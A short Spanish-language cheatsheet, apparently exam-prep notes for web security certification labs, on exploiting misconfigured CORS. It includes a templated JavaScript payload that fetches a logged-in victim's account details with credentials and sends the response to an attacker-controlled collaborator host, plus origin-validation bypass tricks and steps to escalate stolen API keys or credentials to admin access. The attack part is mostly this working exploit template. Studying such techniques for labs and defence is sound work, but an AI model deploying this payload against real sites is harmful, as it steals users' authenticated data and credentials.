---
tipo: cheatsheet
vuln: cors
tags: [bscp, tipo/cheatsheet, vuln/cors]
relacionada: "[[CORS]]"
---

# CS · CORS

## Flujo repetible
1. Refleja tu Origin y observa ACAO/ACAC.
2. Si confía con credenciales, exfiltra datos desde {{EXPLOIT}}.

## Detección
```
Envía Origin: https://{{COLLAB}} y observa si se refleja en Access-Control-Allow-Origin
con Access-Control-Allow-Credentials: true.
```

## Plantillas de payload
```html
<script>
var r=new XMLHttpRequest();
r.onload=function(){location='//{{COLLAB}}/?d='+encodeURIComponent(this.responseText)};
r.open('GET','{{BASE}}/accountDetails',true);
r.withCredentials=true; r.send();
</script>
```
```
Bypasses: Origin: null (iframe sandbox) · subdominio con XSS · validación por prefijo/sufijo
```

## Escalada al objetivo
Exfiltrar datos autenticados de {{VICTIM}} (API keys/credenciales) → login/admin.

## Checklist
- [ ] Confirmé ACAO refleja Origin + ACAC true
- [ ] Exfiltré datos sensibles a {{COLLAB}}

## Referencias
- https://portswigger.net/web-security/cors
